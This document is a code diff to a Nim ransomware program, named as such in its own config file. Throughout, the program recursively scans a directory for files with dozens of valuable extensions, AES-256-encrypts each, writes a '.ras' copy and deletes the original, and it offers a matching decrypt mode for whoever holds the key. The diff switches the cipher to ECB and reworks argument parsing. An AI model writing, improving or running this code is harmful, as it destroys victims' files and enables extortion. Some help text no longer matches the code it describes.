@@ -1,27 +1,24 @@
-import nimcrypto / [rijndael, bcmode], logging, os, spinny, parseopt
-from json import `$`, parseJson
+import nimcrypto / [rijndael, bcmode], spinny
+import std / [logging, os]
+from std / json import `$`, parseJson
 from std / jsonutils import toJson, jsonTo
-from strformat import fmt
-from strutils import split, strip
-from sequtils import foldl
+from std / strformat import fmt
+from std / strutils import split, strip, parseEnum
 
 type
 
-    EncryptedFile = object
+    EncryptedFile = ref object
+
         path : string
-        size : int
         encrypted : bool
 
-    FileData = object
+    FileData = ref object
+
         completed: bool
         filepaths: seq[EncryptedFile]
 
-    Action = enum
-        Encrypt, Decrypt, None
-
 const
     FILENAME = "ransomeware.json"
-    CONFIG_FILE = getConfigDir() / FILENAME
     FILETYPE = [
         ".sql", ".mp4", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".csv",
         ".d3dbsp", ".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf",
@@ -49,134 +46,132 @@ const
         ".xlam", ".xla", ".xlsb", ".xltm", ".xltx", ".xlsm", ".xlsx", ".xlm", ".xlt",
     ]
 
-let logger = newConsoleLogger(lvlInfo, fmtStr = "$levelname : [$datetime] ")
-logger.addHandler
+let
+    configFile = getConfigDir() / FILENAME
+    logger = newConsoleLogger(fmtStr = "$levelname -> ")
 
-proc encryptFile(path, privatekey, key_iv : string) : int =
+addHandler(logger)
+proc posOfLastData(data : openArray[byte]) : int =
 
+    result = data.len()
+    for pos in countdown(result - 1, 0):
+
+        if data[pos] != 0:
+
+            return pos
+
+proc encryptFile(path, privatekey : string) =
     ## Encrypts the contents of a file and returns the file's size
+
+    var encryption : ECB[aes256]
     let
-        original_file = open(path, fmRead)
-        encrypted_file = open(path & ".rsw", fmWrite)
+        encryptedFile = open(path & ".ras", fmWrite)
+        data = readFile(path)
+        blockLength : int = block :
+
+            var length : int = aes256.sizeBlock
+            let dataLength : int = data.len()
+
+            if dataLength > length:
+
+                if dataLength mod aes256.sizeBlock != 0:
+
+                    length = aes256.sizeBlock * ((data.len div aes256.sizeBlock) + 1)
+
+                else:
+
+                    length = aes256.sizeBlock * (data.len div aes256.sizeBlock)
+
+            length
 
     var
-        privatekey = privatekey
-        key_iv = key_iv
-        data = original_file.readAll()
-        encryption : CBC[aes256]
-        key = newString(aes256.sizeKey)
-        iv = newString(aes256.sizeBlock)
-        
+        bytekey : seq[byte] = newSeq[byte](aes256.sizeKey)
+        bytedata : seq[byte] = newSeq[byte](blockLength)
+        encryptedata : seq[byte] = newSeq[byte](blockLength)
 
-    if data.len < aes256.sizeBlock:
+    copyMem(addr bytekey[0], privatekey[0].unsafeAddr(), privatekey.len())
+    copyMem(addr bytedata[0], data[0].unsafeAddr(), data.len())
 
-        result = aes256.sizeBlock
-    else:
-
-        if data.len mod aes256.sizeBlock != 0:
-
-            result = aes256.sizeBlock * ((data.len div aes256.sizeBlock) + 1)
-        else:
-
-            result = aes256.sizeBlock * (data.len div aes256.sizeBlock)
-    
-    var 
-        normaltext = newString(result)
-        encryptedtext = newString(result)
-
-    copyMem(addr normaltext[0], addr data[0], result)
-    copyMem(addr key[0], addr privatekey[0], aes256.sizeKey)
-    copyMem(addr iv[0], addr key_iv[0], aes256.sizeBlock)
-    
-    encryption.init(key, iv)
-    encryption.encrypt(normaltext, encryptedtext)
+    encryption.init(bytekey)
+    encryption.encrypt(bytedata, encryptedata)
     encryption.clear()
 
-    encrypted_file.write(encryptedtext)
-
-    original_file.flushFile()
-    encrypted_file.flushFile()
-
-    original_file.close()
-    encrypted_file.close()
+    discard encryptedFile.writeBytes(encryptedata, 0, encryptedata.posOfLastData())
+    encryptedFile.close()
 
     removeFile(path)
 
-proc decryptFile(path, privatekey, key_iv : string, size : int) : bool =
-
+proc decryptFile(path, privatekey : string) =
     ## Decrypts the content of a file, returns true if successful and false if not
-    try:
 
-        let
-            original_file = open(path, fmRead)
-            pathcontent = path.splitFile
-            encrypted_file = open(pathcontent.dir / pathcontent.name, fmWrite)
+    var decryption : ECB[aes256]
+    let
+        pathcontent = path.splitFile
+        decryptedFile = open(pathcontent.dir / pathcontent.name, fmWrite)
+        data = readFile(path)
+        blockLength : int = block :
 
-        var
-            privatekey = privatekey
-            key_iv = key_iv
-            data = original_file.readAll()
-            decryption : CBC[aes256]
-            key = newString(aes256.sizeKey)
-            iv = newString(aes256.sizeBlock)
-            encryptedtext = newString(size)
-            decryptedtext = newString(size)
+            var length : int = aes256.sizeBlock
+            let dataLength : int = data.len()
 
-        copyMem(addr encryptedtext[0], addr data[0], size)
-        copyMem(addr key[0], addr privatekey[0], aes256.sizeKey)
-        copyMem(addr iv[0], addr key_iv[0], aes256.sizeBlock)
-        
-        decryption.init(key, iv)
-        decryption.decrypt(encryptedtext, decryptedtext)
-        decryption.clear()
-        
-        encrypted_file.write(decryptedtext)
-        
-        original_file.flushFile()
-        encrypted_file.flushFile()
+            if dataLength > length:
 
-        original_file.close()
-        encrypted_file.close()
-        
-        removeFile(path)
-        return true
-    except Exception as e:
-    
+                if dataLength mod aes256.sizeBlock != 0:
+
+                    length = aes256.sizeBlock * ((data.len div aes256.sizeBlock) + 1)
+
+                else:
+
+                    length = aes256.sizeBlock * (data.len div aes256.sizeBlock)
+
+            length
+
+    var
+        bytekey : seq[byte] = newSeq[byte](aes256.sizeKey)
+        bytedata : seq[byte] = newSeq[byte](blockLength)
+        decryptedata : seq[byte] = newSeq[byte](blockLength)
+
+    copyMem(addr bytekey[0], privatekey[0].unsafeAddr(), privatekey.len())
+    copyMem(addr bytedata[0], data[0].unsafeAddr(), data.len())
+
+    decryption.init(bytekey)
+    decryption.decrypt(bytedata, decryptedata)
+    decryption.clear()
+
+    discard decryptedFile.writeBytes(decryptedata, 0, decryptedata.posOfLastData())
+    decryptedFile.close()
+
+    removeFile(path)
+
+proc findAllFiles(path : string) : bool =
+
+    result = true
+    if not dirExists(path):
+
         return false
 
-proc findAllFiles(path : string = getHomeDir()) =
-
-    var data: FileData
-    proc getDirFiles(dir : string) {.closure.} =
-
-        ## Get all files in a directory and it's sub directories recursively
-        for kind, path in walkDir(dir) :
-
-            if kind == pcDir:
-                
-                getDirFiles(path)
-            elif kind == pcFile:
-
-                if path.splitFile().ext in FILETYPE:
-
-                    data.filepaths.add(EncryptedFile(path : path, size : 0, encrypted : false))
-
+    var data : FileData = new FileData
     let spinner = newSpinny(fmt"Scanning dir {path} and it's sub directories for files", skClock)
     spinner.start()
 
-    getDirFiles(path)
+    for file in walkDirRec(path):
+
+        if file.splitFile().ext in FILETYPE:
+
+            data.filepaths.add(EncryptedFile(path : file))
+
     data.completed = true
     spinner.success("Finished scanning")
 
     ## Write information of all files to FILENAME
-    writeFile(CONFIG_FILE, $toJson(data))
-    info(fmt"Saved all discovered files to {CONFIG_FILE}")
+    writeFile(configFile, $toJson(data))
+    notice(fmt"saved all discovered files to {configFile}")
 
-proc encryptFiles(key, iv : string) =
+proc encryptFiles(key : string) =
 
     ## Loads data of all discovered files from FILENAME
     let
-        file = open(CONFIG_FILE, fmRead)
+        file = open(configFile, fmRead)
         content = file.readAll()
         settings = parseJson(content)
         spinner = newSpinny(fmt"Encrypting all discovered files", makeSpinner(skClock.interval, skClock.frames))
@@ -193,51 +188,63 @@ proc encryptFiles(key, iv : string) =
             ## Check if file exists, if it does encrypt it.
             if fileExists(data.filepaths[pos].path):
 
-                data.filepaths[pos].size = encryptFile(data.filepaths[pos].path, key, iv)
+                encryptFile(data.filepaths[pos].path, key)
                 data.filepaths[pos].encrypted = true
 
         except:
 
             continue
-    
+
     spinner.success("Finished encryption")
 
     ## Write information of all files to FILENAME
-    writeFile(CONFIG_FILE, $toJson(data))
-    info(fmt"Encrypted all files in {CONFIG_FILE}")
+    writeFile(configFile, $toJson(data))
+    notice(fmt"encrypted all files in {configFile}")
 
-proc decryptFiles(key, iv : string) =
+proc decryptFiles(key : string) =
 
     let
-        file = open(CONFIG_FILE, fmRead)
-        content = file.readAll()
+        content = readFile(configFile)
         settings = parseJson(content)
-        spinner = newSpinny(fmt"Decrypting all discovered files", makeSpinner(skClock.interval, skClock.frames))
+        spinner = newSpinny("Decrypting all discovered files", makeSpinner(skClock.interval, skClock.frames))
 
     spinner.start()
     var data = settings.jsonTo(FileData)
-    for pos in 0..<data.filepaths.len:
-        
-        if data.filepaths[pos].encrypted and fileExists(data.filepaths[pos].path):
-            
-            try:
-                
-                if decryptFile(data.filepaths[pos].path & ".rsw", key, iv, data.filepaths[pos].size):
+    for pos in 0..<data.filepaths.len():
 
+        let encryptedFile = data.filepaths[pos].path & ".ras"
+        if data.filepaths[pos].encrypted and fileExists(encryptedFile):
+
+            try:
+
+                if fileExists(encryptedFile):
+
+                    decryptFile(encryptedFile, key)
                     data.filepaths[pos].encrypted = false
-                
+
             except:
 
                 continue
-    
+
     spinner.success("Finished decryption")
 
     ## Write information of all files to FILENAME
-    writeFile(CONFIG_FILE, $toJson(data))
-    info(fmt"Decrypted all files in {CONFIG_FILE}")
+    writeFile(configFile, $toJson(data))
+    notice(fmt"decrypted all files in {configFile}")
 
 when isMainModule:
-    
+
+    import std / [parseopt]
+    from std / sequtils import foldl
+
+    type
+
+        Action {.pure.} = enum
+
+            None
+            Encrypt = "encrypt"
+            Decrypt = "decrypt"
+
     ## Get and parse cmd parameters
     let
         cmdparams = commandLineParams()
@@ -251,17 +258,20 @@ when isMainModule:
 
             Options:
 
-                --scandir  | -s:[path to dir]                 Scans a dir and it's sub dir for files, if path is not given or directory not found. Scans root dir
-                --key      | -k:[encryption key]              Encryption key
-                --iv       | -i:[encryption iv]               Encryption iv
-                --encrypt  | -e                               Encrypts all discovered files. If {CONFIG_FILE} is not found throws an exception. Requires option key and iv
-                --decrypt  | -d                               Decrypts all discovered files. If {CONFIG_FILE} is not found throws an exception. Requires option key and iv
-                --help     | -h                               Print's this help message"""
+                --dir      | -d:[ path to dir ]               Dir to be scanned and encrypted / decrypted. If path is not given or directory not found. Scans root dir
+                --key      | -k:[ encryption key ]            Encryption key
+                --help     | -h                               Print's this help message
+
+            Argument:
+
+                encrypt                                       Encrypts all discovered files. If {configFile} is not found throws an exception. Requires option key and iv
+                decrypt                                       Decrypts all discovered files. If {configFile} is not found throws an exception. Requires option key and iv
+            """
 
     if cmdparams.len != 0:
 
-        var 
-            run_info : tuple[key, iv : string, action : Action] = ("", "", None)
+        var
+            runInfo : tuple[dir, key : string, action : Action] = ("", "", None)
             params = initOptParser(cmdparams.foldl("{a} {b}".fmt))
 
         while true:
@@ -271,54 +281,66 @@ when isMainModule:
 
             of cmdEnd: break
             of cmdShortOption, cmdLongOption:
-                
-                if params.key == "scandir" or params.key == "s":
 
-                    ## If dir exists scan dir else scan root dir
-                    let dir = $params.val
-                    if dirExists(dir):
+                if params.key == "dir" or params.key == "d":
 
-                        findAllFiles(dir)
-                    else:
+                    runInfo.dir = params.val
 
-                        findAllFiles()
                 elif params.key == "key" or params.key == "k":
 
-                    run_info.key = params.val
-                elif params.key == "iv" or params.key == "i":
+                    runInfo.key = params.val
 
-                    run_info.iv = params.val
-                elif params.key == "encrypt" or params.key == "e":
-
-                    run_info.action = Encrypt
-                elif params.key == "decrypt" or params.key == "d":
-
-                    run_info.action = Decrypt
                 elif params.key == "help" or params.key == "h":
 
                     for line in help.split("\n"):
 
                         stdout.writeLine line.strip
 
+                else:
+
+                    fatal fmt"invalid option {params.key}"
+
             of cmdArgument:
 
-                discard
-    
-        if run_info.key.len > 0 and run_info.iv.len > 0:
+                try:
 
-            if fileExists(CONFIG_FILE):
+                    runInfo.action = parseEnum[Action](params.key)
 
-                case run_info.action
+                except ValueError:
+
+                    fatal fmt"argument {params.key} is invalid"
+                    quit QuitFailure
+
+        if runInfo.key.len() > 0:
+
+            if fileExists(configFile):
+
+                case runInfo.action
 
                 of Encrypt:
 
-                    encryptFiles(run_info.key, run_info.iv)
+                    if not findAllFiles(runInfo.dir):
+
+                        fatal fmt"dir {runInfo.dir} not found"
+                        quit QuitFailure
+
+                    encryptFiles(runInfo.key)
+
                 of Decrypt:
 
-                    decryptFiles(run_info.key, run_info.iv)
+                    if not fileExists(configFile):
+
+                        fatal fmt"cannot find config file at {configFile}"
+                        quit QuitFailure
+
+                    decryptFiles(runInfo.key)
+
                 else:
 
-                    discard
+                    fatal "no argument is supply"
+                    quit QuitFailure
+
             else:
 
-                raise newException(Exception, fmt"Could not find file {CONFIG_FILE}")
+                fatal fmt"could not find file {configFile}"
+                quit QuitFailure
